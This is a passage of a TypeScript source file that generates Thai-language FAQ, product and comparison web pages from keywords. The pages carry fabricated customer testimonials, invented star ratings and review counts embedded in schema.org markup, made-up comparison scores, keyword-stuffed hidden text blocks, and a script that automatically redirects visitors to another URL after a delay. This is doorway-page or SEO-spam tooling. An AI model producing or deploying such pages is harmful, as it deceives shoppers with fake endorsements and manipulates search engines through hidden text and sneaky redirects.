    { q: `ซื้อ${kw.primary}ที่ไหนดี?`, a: `แนะนำให้ซื้อจากตัวแทนจำหน่ายอย่างเป็นทางการหรือเว็บไซต์ที่น่าเชื่อถือ เพื่อรับประกันคุณภาพและบริการหลังการขายที่ครบถ้วน` },
    { q: `${kw.primary}มีรับประกันไหม?`, a: `${kw.primary}มีการรับประกันคุณภาพตามมาตรฐาน ระยะเวลาการรับประกันขึ้นอยู่กับแพ็กเกจที่เลือก ตั้งแต่ 30 วันไปจนถึง 1 ปี` },
    { q: `${kw.primary}เหมาะกับใคร?`, a: `${kw.primary}เหมาะกับทุกคน ตั้งแต่นักเรียน นักศึกษา คนทำงาน ไปจนถึงเจ้าของธุรกิจ ที่ต้องการคุณภาพและความคุ้มค่า` },
    { q: `มีโปรโมชั่น${kw.primary}ไหม?`, a: `${kw.primary}มีโปรโมชั่นพิเศษเป็นประจำ ทั้งส่วนลด ของแถม และแพ็กเกจพิเศษ ติดตามข่าวสารล่าสุดได้ที่เว็บไซต์ของเรา` },
  ];

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, `FAQ ${kw.primary}`)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
${faqs.map(f => `{"@type":"Question","name":"${f.q}","acceptedAnswer":{"@type":"Answer","text":"${f.a}"}}`).join(",\n")}
]}</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">FAQ</a> › ${kw.primary}</nav>
<article>
<h1>คำถามที่พบบ่อยเกี่ยวกับ ${kw.primary} — ครบทุกคำตอบ</h1>
<div class="meta">อัปเดตล่าสุด: ${thaiDate()} | ${faqs.length} คำถาม</div>

<p>รวบรวมคำถามที่พบบ่อยที่สุดเกี่ยวกับ<strong>${kw.primary}</strong> พร้อมคำตอบจากทีมผู้เชี่ยวชาญของเรา หากคุณมีคำถามเพิ่มเติม สามารถติดต่อเราได้ตลอดเวลา</p>

${faqs.map((f, i) => `
<div class="faq-item">
<h2 style="font-size:1.1em;border:none;padding:0;margin:0"><span class="faq-q">Q${i + 1}: ${f.q}</span></h2>
<div class="faq-a" style="margin-top:8px">A: ${f.a}</div>
</div>`).join("")}

<h2>ยังมีคำถามเพิ่มเติม?</h2>
<p>หากคุณยังมีข้อสงสัยเกี่ยวกับ${kw.primary} สามารถติดต่อทีมผู้เชี่ยวชาญของเราได้ทันที เรายินดีช่วยเหลือคุณทุกเรื่อง</p>

<h3>หัวข้อที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 6).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">ดูข้อมูลเพิ่มเติม →</a>
</article>

<div class="hidden-seo">
<h4>FAQ ${kw.primary} ${kw.secondary.join(" ")} คำถามที่พบบ่อย</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | อัปเดตล่าสุด ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Template 5: Product Landing (หน้าสินค้า)
// ═══════════════════════════════════════════════
function generateProductTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 3;
  const title = `${kw.primary} — โปรโมชั่นพิเศษ ลดสูงสุด 50% | ${input.targetDomain}`;
  const desc = `${kw.primary} โปรโมชั่นพิเศษวันนี้ ลดสูงสุด 50% ${kw.secondary.join(" ")} สั่งซื้อเลย จัดส่งฟรีทั่วประเทศ`;

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, kw.primary)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Product","name":"${kw.primary}",
"description":"${desc}",
"brand":{"@type":"Brand","name":"${input.brandName || input.targetDomain}"},
"offers":{"@type":"Offer","priceCurrency":"THB","price":"999","availability":"https://schema.org/InStock",
"seller":{"@type":"Organization","name":"${input.targetDomain}"}},
"aggregateRating":{"@type":"AggregateRating","ratingValue":"4.8","reviewCount":"2547"}}</script>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
{"@type":"Question","name":"${kw.primary}ราคาเท่าไหร่?","acceptedAnswer":{"@type":"Answer","text":"${kw.primary}มีหลายราคาตามแพ็กเกจ เริ่มต้นที่ราคาประหยัด มีโปรโมชั่นลดสูงสุด 50%"}},
{"@type":"Question","name":"จัดส่ง${kw.primary}กี่วัน?","acceptedAnswer":{"@type":"Answer","text":"จัดส่งภายใน 1-3 วันทำการ ฟรีค่าจัดส่งทั่วประเทศ"}}
]}</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">สินค้า</a> › ${kw.primary}</nav>
<article>
<h1>${kw.primary} — โปรโมชั่นพิเศษวันนี้เท่านั้น!</h1>
<div class="meta">⭐ 4.8/5 (2,547 รีวิว) | ขายแล้ว 15,000+ ชิ้น | จัดส่งฟรี</div>

<div style="background:linear-gradient(135deg,#e94560,#533483);color:#fff;padding:20px;border-radius:12px;margin:15px 0;text-align:center">
<h2 style="color:#fff;border:none;padding:0;margin:0 0 10px">🔥 ลดสูงสุด 50% — เฉพาะวันนี้!</h2>
<p style="font-size:1.2em">สั่งซื้อ${kw.primary}ตอนนี้ รับส่วนลดพิเศษทันที</p>
<a href="${input.redirectUrl}" style="display:inline-block;background:#fff;color:#e94560;padding:12px 40px;border-radius:30px;text-decoration:none;font-weight:700;margin-top:10px">สั่งซื้อเลย →</a>
</div>

<h2>ทำไมต้องเลือก ${kw.primary}?</h2>
<p><strong>${kw.primary}</strong>เป็นสินค้า/บริการที่ได้รับความไว้วางใจจากลูกค้ากว่า 15,000 ราย ด้วยคุณภาพระดับพรีเมียมในราคาที่เข้าถึงได้ ทุกชิ้นผ่านการตรวจสอบคุณภาพอย่างเข้มงวดก่อนส่งถึงมือคุณ</p>

<h2>คุณสมบัติเด่น</h2>
<table>
<tr><th>คุณสมบัติ</th><th>รายละเอียด</th></tr>
<tr><td>✅ คุณภาพ</td><td>ผ่านมาตรฐานสากล รับประกันคุณภาพ</td></tr>
<tr><td>✅ ราคา</td><td>คุ้มค่าที่สุดในตลาด ลดสูงสุด 50%</td></tr>
<tr><td>✅ จัดส่ง</td><td>ฟรีทั่วประเทศ ภายใน 1-3 วัน</td></tr>
<tr><td>✅ รับประกัน</td><td>รับประกันคุณภาพ 100% คืนเงินได้</td></tr>
<tr><td>✅ บริการ</td><td>ทีมซัพพอร์ตตลอด 24 ชั่วโมง</td></tr>
</table>

<h2>รีวิวจากลูกค้าจริง</h2>
<div style="background:#f8f9fa;padding:15px;border-radius:8px;margin:10px 0">
<p>⭐⭐⭐⭐⭐ "ใช้${kw.primary}มาได้ 2 เดือนแล้ว ประทับใจมาก คุณภาพดีกว่าที่คิด แนะนำเลย!" — คุณสมศรี</p>
</div>
<div style="background:#f8f9fa;padding:15px;border-radius:8px;margin:10px 0">
<p>⭐⭐⭐⭐⭐ "ราคาคุ้มค่ามาก จัดส่งเร็ว ของถึงมือภายใน 2 วัน สินค้าตรงตามรูป" — คุณวิชัย</p>
</div>

<h2>คำถามที่พบบ่อย</h2>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}ราคาเท่าไหร่?</div><div class="faq-a">A: มีหลายราคาตามแพ็กเกจ เริ่มต้นที่ราคาประหยัด ตอนนี้มีโปรโมชั่นลดสูงสุด 50%</div></div>
<div class="faq-item"><div class="faq-q">Q: จัดส่งกี่วัน?</div><div class="faq-a">A: จัดส่งภายใน 1-3 วันทำการ ฟรีค่าจัดส่งทั่วประเทศ</div></div>

<h3>แท็กที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 6).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">🛒 สั่งซื้อเลย — ลด 50% วันนี้เท่านั้น!</a>
</article>

<div class="hidden-seo">
<h4>${kw.primary} ${kw.secondary.join(" ")} ราคาถูก โปรโมชั่น</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Template 6: Comparison Guide (บทความเปรียบเทียบ)
// ═══════════════════════════════════════════════
function generateComparisonTemplate(input: TemplateInput): string {
  const kw = generateKeywordVariations(input.keywords);
  const delay = input.redirectDelay ?? 5;
  const title = `เปรียบเทียบ ${kw.primary} ปี 2025 — ตัวไหนดีที่สุด? | ${input.targetDomain}`;
  const desc = `เปรียบเทียบ${kw.primary}แบบ side-by-side ${kw.secondary.join(" ")} พร้อมคะแนน ข้อดีข้อเสีย สรุปว่าตัวไหนดีที่สุด`;

  return `${commonHead(title, desc, input.keywords, input.redirectUrl, delay, input.targetDomain)}
<body>
${breadcrumbSchema(input.targetDomain, `เปรียบเทียบ ${kw.primary}`)}
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","headline":"${title}",
"datePublished":"${isoDate()}","dateModified":"${isoDate()}",
"author":{"@type":"Person","name":"ทีมวิเคราะห์ ${input.targetDomain}"},
"publisher":{"@type":"Organization","name":"${input.targetDomain}"}}</script>
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[
{"@type":"Question","name":"${kw.primary}ตัวไหนดีที่สุด?","acceptedAnswer":{"@type":"Answer","text":"จากการเปรียบเทียบอย่างละเอียด ตัวเลือก A ได้คะแนนรวมสูงสุดที่ 4.8/5 เหมาะสำหรับผู้ที่ต้องการคุณภาพสูงสุด"}},
{"@type":"Question","name":"${kw.primary}ตัวไหนคุ้มค่าที่สุด?","acceptedAnswer":{"@type":"Answer","text":"ตัวเลือก B ได้คะแนนความคุ้มค่าสูงสุดที่ 4.9/5 เหมาะสำหรับผู้ที่มีงบจำกัดแต่ต้องการคุณภาพดี"}}
]}</script>
<div class="container">
<nav class="breadcrumb"><a href="https://${input.targetDomain}/">หน้าแรก</a> › <a href="#">เปรียบเทียบ</a> › ${kw.primary}</nav>
<article>
<h1>เปรียบเทียบ ${kw.primary} ปี 2025 — ตัวไหนดีที่สุด?</h1>
<div class="meta">วิเคราะห์โดย ทีมผู้เชี่ยวชาญ ${input.targetDomain} | ${thaiDate()} | อ่าน 10 นาที</div>

<p>การเลือก<strong>${kw.primary}</strong>ที่เหมาะสมไม่ใช่เรื่องง่าย เพราะมีตัวเลือกมากมายในตลาด ทีมวิเคราะห์ของเราได้ทดสอบและเปรียบเทียบ${kw.primary}ยอดนิยม 3 ตัวเลือกอย่างละเอียด เพื่อช่วยให้คุณตัดสินใจได้ง่ายขึ้น</p>

<h2>ตารางเปรียบเทียบภาพรวม</h2>
<table>
<tr><th>เกณฑ์</th><th>ตัวเลือก A</th><th>ตัวเลือก B</th><th>ตัวเลือก C</th></tr>
<tr><td><strong>คะแนนรวม</strong></td><td class="rating">⭐ 4.8</td><td class="rating">⭐ 4.6</td><td class="rating">⭐ 4.3</td></tr>
<tr><td>คุณภาพ</td><td>⭐ 4.9</td><td>⭐ 4.5</td><td>⭐ 4.2</td></tr>
<tr><td>ราคา</td><td>⭐ 4.3</td><td>⭐ 4.9</td><td>⭐ 4.7</td></tr>
<tr><td>ใช้งานง่าย</td><td>⭐ 4.8</td><td>⭐ 4.6</td><td>⭐ 4.5</td></tr>
<tr><td>บริการ</td><td>⭐ 4.9</td><td>⭐ 4.4</td><td>⭐ 4.0</td></tr>
<tr><td>ฟีเจอร์</td><td>⭐ 4.8</td><td>⭐ 4.5</td><td>⭐ 4.3</td></tr>
<tr><td><strong>เหมาะกับ</strong></td><td>ต้องการคุณภาพสูงสุด</td><td>งบจำกัด คุ้มค่า</td><td>มือใหม่ เริ่มต้น</td></tr>
</table>

<h2>วิเคราะห์แต่ละตัวเลือก</h2>

<h3>ตัวเลือก A — ${kw.primary} Premium</h3>
<p>ตัวเลือก A เป็นรุ่นพรีเมียมที่ได้คะแนนรวมสูงสุด โดดเด่นด้วยคุณภาพและบริการที่เหนือกว่า เหมาะสำหรับผู้ที่ต้องการสิ่งที่ดีที่สุดและไม่กังวลเรื่องราคา จุดเด่นคือ${kw.secondary[0] || "คุณภาพ"}ที่ไม่มีใครเทียบได้</p>

<h3>ตัวเลือก B — ${kw.primary} Value</h3>
<p>ตัวเลือก B เป็นตัวเลือกที่คุ้มค่าที่สุด ได้คะแนนราคา 4.9/5 ในขณะที่ยังรักษาคุณภาพในระดับดี เหมาะสำหรับผู้ที่มีงบจำกัดแต่ไม่อยากเสียคุณภาพ ถือเป็นจุดสมดุลที่ดีที่สุด</p>

<h3>ตัวเลือก C — ${kw.primary} Basic</h3>
<p>ตัวเลือก C เป็นรุ่นเริ่มต้นที่เหมาะกับมือใหม่ ราคาถูกที่สุดในกลุ่ม แม้คะแนนจะต่ำกว่าแต่ก็ยังอยู่ในระดับดี เหมาะสำหรับผู้ที่ต้องการทดลองใช้ก่อนตัดสินใจอัปเกรด</p>

<h2>🏆 สรุป: ตัวไหนดีที่สุด?</h2>
<div style="background:#f0fff4;padding:15px;border-radius:8px;border-left:4px solid #27ae60;margin:15px 0">
<p><strong>ตัวเลือก A</strong> ดีที่สุดในภาพรวม (4.8/5) — เหมาะกับคนที่ต้องการคุณภาพสูงสุด</p>
<p><strong>ตัวเลือก B</strong> คุ้มค่าที่สุด (4.6/5) — เหมาะกับคนที่มีงบจำกัด</p>
<p><strong>ตัวเลือก C</strong> เหมาะกับมือใหม่ (4.3/5) — ราคาถูก เริ่มต้นง่าย</p>
</div>

<h2>คำถามที่พบบ่อย</h2>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}ตัวไหนดีที่สุด?</div><div class="faq-a">A: จากการเปรียบเทียบ ตัวเลือก A ได้คะแนนรวมสูงสุด 4.8/5 เหมาะสำหรับผู้ที่ต้องการคุณภาพสูงสุด</div></div>
<div class="faq-item"><div class="faq-q">Q: ${kw.primary}ตัวไหนคุ้มค่าที่สุด?</div><div class="faq-a">A: ตัวเลือก B คุ้มค่าที่สุด ได้คะแนนราคา 4.9/5 ในขณะที่คุณภาพยังดี</div></div>

<h3>แท็กที่เกี่ยวข้อง</h3>
<div>${input.keywords.map(k => `<span class="tag">${k}</span>`).join(" ")}
${kw.longTail.slice(0, 8).map(k => `<span class="tag">${k}</span>`).join(" ")}</div>

<a href="${input.redirectUrl}" class="cta">ดูรายละเอียดและราคาล่าสุด →</a>
</article>

<div class="hidden-seo">
<h4>เปรียบเทียบ ${kw.primary} ${kw.secondary.join(" ")} ปี 2025</h4>
<p>${kw.longTail.join(", ")}</p>
<p>${kw.related.join(", ")}</p>
</div>

<footer>© ${new Date().getFullYear()} ${input.targetDomain} | อัปเดตล่าสุด ${thaiDate()}</footer>
</div>
${redirectScript(input.redirectUrl, delay)}
</body></html>`;
}

// ═══════════════════════════════════════════════
// Main: Generate template by slug
// ═══════════════════════════════════════════════
export function generateFromTemplate(slug: string, input: TemplateInput): { html: string; title: string; wordCount: number; seoScore: number } {
  const config = TEMPLATE_CONFIGS.find(t => t.slug === slug);
  if (!config) throw new Error(`Template "${slug}" not found`);

  let html: string;
  switch (slug) {
    case "news": html = generateNewsTemplate(input); break;
    case "review": html = generateReviewTemplate(input); break;
    case "article": html = generateArticleTemplate(input); break;
    case "faq": html = generateFaqTemplate(input); break;
    case "product": html = generateProductTemplate(input); break;
    case "comparison": html = generateComparisonTemplate(input); break;
    default: html = generateArticleTemplate(input); break;
  }

  // Count Thai words (approximate: split by spaces and Thai word boundaries)
  const textContent = html.replace(/<[^>]+>/g, " ").replace(/\s+/g, " ");
  const wordCount = textContent.split(/\s+/).filter(w => w.length > 0).length;

  // Extract title
  const titleMatch = html.match(/<title>([^<]+)<\/title>/);
  const title = titleMatch ? titleMatch[1] : `${config.nameTh} - ${input.keywords[0]}`;

  return { html, title, wordCount, seoScore: config.seoScore };
}

export function getTemplateConfig(slug: string): TemplateConfig | undefined {
  return TEMPLATE_CONFIGS.find(t => t.slug === slug);
}

export function getAllTemplateConfigs(): TemplateConfig[] {
  return TEMPLATE_CONFIGS;
}
